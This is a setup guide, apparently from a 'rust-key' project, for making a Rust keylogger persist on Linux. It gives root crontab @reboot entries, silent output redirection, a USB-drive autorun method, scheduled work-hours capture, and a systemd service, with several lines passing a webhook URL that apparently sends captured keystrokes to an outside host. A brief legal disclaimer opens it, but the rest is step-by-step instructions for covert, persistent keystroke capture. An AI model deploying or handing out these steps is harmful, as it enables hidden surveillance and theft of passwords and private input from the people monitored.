# Crontab Setup Guide for Rust Keylogger

This guide explains how to set up automatic execution of the rust-key keylogger using crontab.

## ⚠️ Legal and Security Warning

**This guide is for educational and authorized security testing purposes only.**

Unauthorized keylogging may be illegal in your jurisdiction. Always:
- Obtain proper authorization before monitoring any system
- Only use on systems you own or have explicit permission to configure
- Understand the legal implications in your region
- Respect privacy and comply with data protection laws

## Understanding Crontab

Crontab is a time-based job scheduler in Unix-like operating systems. It allows you to schedule commands or scripts to run automatically at specified times or system events.

## Setup Methods

### Method 1: Run Keylogger at System Boot

This is the most common use case - start the keylogger automatically when the system boots.

#### Step 1: Edit Root Crontab

Since the keylogger needs root privileges to access input devices, you need to edit the root user's crontab:

```bash
sudo crontab -e
```

**Note:** If this is your first time running `crontab -e`, you'll be asked to choose an editor (nano is recommended for beginners).

#### Step 2: Add Boot Entry

Add the following line to the crontab file:

```bash
@reboot /path/to/rust-key/target/release/rust-key > /dev/null 2>&1 &
```

Replace `/path/to/rust-key/` with the actual path to your rust-key directory.

#### Step 3: With Webhook Support

If you want to use webhook functionality:

```bash
@reboot /path/to/rust-key/target/release/rust-key https://your-webhook-url > /dev/null 2>&1 &
```

#### Step 4: Save and Exit

- If using nano: Press `Ctrl+X`, then `Y`, then `Enter`
- If using vim: Press `Esc`, type `:wq`, press `Enter`

#### Step 5: Verify the Crontab Entry

```bash
sudo crontab -l
```

This should display your newly added entry.

### Method 2: USB Drive Execution on Boot

If you want to run the keylogger from a USB drive that's already plugged in at boot:

```bash
sudo crontab -e
```

Add:
```bash
@reboot sleep 30 && /run/media/username/VOLUME_NAME/usb_autorun.sh > /dev/null 2>&1 &
```

Replace:
- `username` with your actual username
- `VOLUME_NAME` with your USB drive's volume label

The `sleep 30` gives the system time to mount the USB drive before trying to execute the script.

### Method 3: Scheduled Execution

You can also schedule the keylogger to start and stop at specific times:

```bash
sudo crontab -e
```

Add:
```bash
# Start keylogger at 9 AM on weekdays
0 9 * * 1-5 /path/to/rust-key/target/release/rust-key > /dev/null 2>&1 &

# Stop keylogger at 5 PM on weekdays
0 17 * * 1-5 pkill rust-key
```

## Crontab Time Format

Understanding the crontab time format:

```
* * * * * command
│ │ │ │ │
│ │ │ │ └─── Day of week (0-7, Sunday = 0 or 7)
│ │ │ └───── Month (1-12)
│ │ └─────── Day of month (1-31)
│ └───────── Hour (0-23)
└─────────── Minute (0-59)
```

### Special Strings

- `@reboot` - Run once at startup
- `@hourly` - Run once an hour (0 * * * *)
- `@daily` - Run once a day (0 0 * * *)
- `@weekly` - Run once a week (0 0 * * 0)
- `@monthly` - Run once a month (0 0 1 * *)

## Examples

### Example 1: Basic Boot Startup

```bash
# Edit root crontab
sudo crontab -e

# Add this line:
@reboot /home/user/rust-key/target/release/rust-key > /dev/null 2>&1 &
```

### Example 2: Boot Startup with Log File on USB

```bash
@reboot sleep 30 && /run/media/user/MYUSB/rust-key > /run/media/user/MYUSB/logs/keylog.txt 2>&1 &
```

### Example 3: Scheduled Monitoring During Work Hours

```bash
# Start at 8 AM Monday-Friday
0 8 * * 1-5 /usr/local/bin/rust-key https://webhook-url > /dev/null 2>&1 &

# Stop at 6 PM Monday-Friday
0 18 * * 1-5 pkill -f rust-key
```

### Example 4: Weekly Log Rotation

```bash
# Run keylogger at boot
@reboot /usr/local/bin/rust-key > /dev/null 2>&1 &

# Rotate logs every Sunday at midnight
0 0 * * 0 /path/to/rotate-logs.sh
```

## Managing the Crontab

### View Current Crontab Entries

```bash
# View root's crontab
sudo crontab -l

# View your user's crontab
crontab -l
```

### Edit Crontab

```bash
# Edit root's crontab
sudo crontab -e

# Edit your user's crontab
crontab -e
```

### Remove All Crontab Entries

```bash
# Remove root's crontab (use with caution!)
sudo crontab -r

# Remove your user's crontab
crontab -r
```

### Remove Specific Entry

Edit the crontab and delete the specific line:
```bash
sudo crontab -e
# Delete the line you want to remove
# Save and exit
```

## Troubleshooting

### Issue 1: Crontab Entry Not Running

**Check system logs:**
```bash
sudo journalctl -u cron.service -f
# or on some systems:
sudo tail -f /var/log/syslog | grep CRON
```

**Common causes:**
- Incorrect file paths (use absolute paths)
- Permission issues (needs root for keylogger)
- Environment variables not set (cron has minimal environment)

### Issue 2: Command Works Manually But Not in Cron

Cron has a limited environment. Specify full paths:

```bash
# Instead of:
@reboot rust-key

# Use:
@reboot /home/user/rust-key/target/release/rust-key
```

### Issue 3: Crontab File Is Empty

If `sudo crontab -l` shows "no crontab for root", that's normal - it means you haven't created any entries yet. Simply run:

```bash
sudo crontab -e
```

This will create a new crontab file for root.

### Issue 4: USB Drive Not Mounted at Boot Time

If your script depends on a USB drive, add a delay:

```bash
@reboot sleep 30 && /run/media/user/USB/usb_autorun.sh
```

Or check for mount point before executing (with timeout):

```bash
@reboot /bin/bash -c 'count=0; while [ ! -d /run/media/user/USB ] && [ $count -lt 60 ]; do sleep 1; count=$((count+1)); done; [ -d /run/media/user/USB ] && /run/media/user/USB/usb_autorun.sh'
```

This will wait up to 60 seconds for the USB drive to mount.

## Security Best Practices

### 1. Use Full Paths

Always use absolute paths in crontab entries:
```bash
# Good
@reboot /usr/local/bin/rust-key

# Bad
@reboot rust-key
```

### 2. Redirect Output Properly

```bash
# Silent (no output)
@reboot /path/to/rust-key > /dev/null 2>&1 &

# Log output to file
@reboot /path/to/rust-key >> /var/log/rust-key.log 2>&1 &
```

### 3. Set Appropriate Permissions

```bash
# Only root should be able to read root's crontab
sudo chmod 600 /var/spool/cron/crontabs/root
```

### 4. Use Process Management

Instead of direct execution, consider using systemd services for better process management:

```bash
# In crontab:
@reboot systemctl start rust-keylogger.service

# Better control with systemd
sudo systemctl status rust-keylogger.service
sudo systemctl stop rust-keylogger.service
```

## Advanced Configuration

### Using Environment Variables

Cron has a minimal environment. You can set variables at the top of the crontab:

```bash
sudo crontab -e
```

Add:
```bash
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
WEBHOOK_URL=https://your-webhook-url

@reboot /path/to/rust-key $WEBHOOK_URL > /dev/null 2>&1 &
```

### Email Notifications

Cron can email you output (if mail is configured):

```bash
MAILTO=your@email.com

@reboot /path/to/rust-key 2>&1
```

### Conditional Execution

```bash
# Only run if USB drive is mounted
@reboot [ -d /run/media/user/USB ] && /run/media/user/USB/usb_autorun.sh
```

## Alternative: Systemd Service (Recommended)

Instead of cron, consider using a systemd service for better control and logging:

Create `/etc/systemd/system/rust-keylogger.service`:

```ini
[Unit]
Description=Rust Keylogger Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/path/to/rust-key/target/release/rust-key
WorkingDirectory=/path/to/logs
Restart=on-failure
RestartSec=10

[Install]
WantedBy=multi-user.target
```

Enable and start:
```bash
sudo systemctl daemon-reload
sudo systemctl enable rust-keylogger.service
sudo systemctl start rust-keylogger.service
```

See README.md for more details on systemd services.

## Cleanup

To remove the keylogger from automatic startup:

### Remove from Crontab

```bash
sudo crontab -e
# Delete the @reboot line
# Save and exit
```

### Verify Removal

```bash
sudo crontab -l
```

### Stop Running Instance

```bash
sudo pkill rust-key
# or
sudo killall rust-key
```

## Verification

To verify your crontab setup will work:

### 1. Test the Command Manually

```bash
# Test with sudo (as cron will run it)
sudo /path/to/rust-key/target/release/rust-key
```

Press Ctrl+C if it starts successfully.

### 2. Check Crontab Syntax

```bash
sudo crontab -l
```

Ensure there are no typos and paths are correct.

### 3. Test After Reboot

```bash
# Reboot the system
sudo reboot

# After reboot, check if it's running
ps aux | grep rust-key
```

## Support

For issues or questions:
- Check `/var/log/syslog` or `journalctl -u cron` for cron errors
- Verify file permissions and paths
- Test commands manually before adding to crontab
- See main README.md for general rust-key issues

## License

This guide is part of the rust-key project, licensed under MIT License.
